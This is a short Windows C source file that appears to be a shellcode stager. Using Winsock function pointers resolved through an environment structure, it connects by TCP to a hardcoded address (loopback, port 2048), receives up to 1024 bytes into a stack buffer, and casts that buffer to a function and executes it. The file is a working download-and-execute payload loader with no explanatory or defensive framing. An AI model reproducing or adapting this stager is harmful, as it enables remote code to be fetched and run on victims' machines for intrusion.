#include "init.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windef.h>
#include <stdio.h>
static inline int GetPayload(LPENV pEnv, BYTE pAddr[4], BYTE pPort[2], PCHAR pBuf, LPDWORD pSize);

int start() {
	ENV env;
	BYTE bAddr[4] = {127,0,0,1},bPort[2] = {0x08,0x00};
	CHAR bBuffer[1024];
	DWORD dwSize = sizeof bBuffer;
	Initialize(&env);
	int ret = GetPayload(&env, bAddr, bPort, bBuffer, &dwSize);
	if(ret != 0) return 1;
	
	return ((int(*)())bBuffer)();
	
}

static inline int GetPayload(LPENV pEnv, BYTE pAddr[4], BYTE pPort[2], PCHAR pBuf, LPDWORD pSize)
{
	WSADATA	wsaData ;
	SOCKET sock = INVALID_SOCKET;
	DWORD dwFlag = 0, dwLen;
	struct sockaddr_in addr;
	struct _WSABUF buf;

	pEnv->pfnWSAStartup(MAKEWORD(2, 2), &wsaData);
	sock = pEnv->pfnWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);
	addr.sin_family = AF_INET;
	addr.sin_port = *(unsigned short*) pPort;
	addr.sin_addr.S_un.S_addr = *(unsigned int*) pAddr;
	pEnv->pfnWSAConnect(sock,(struct sockaddr*)&addr,sizeof(addr),NULL,NULL,NULL,NULL);
	buf.buf = pBuf;
	buf.len = *pSize;
	int iResult = pEnv->pfnWSARecv(sock,&buf,1,&dwLen,&dwFlag,NULL,NULL) ;
	if(iResult == SOCKET_ERROR) { return 1; }
	
	*pSize = dwLen;
	return 0;
}
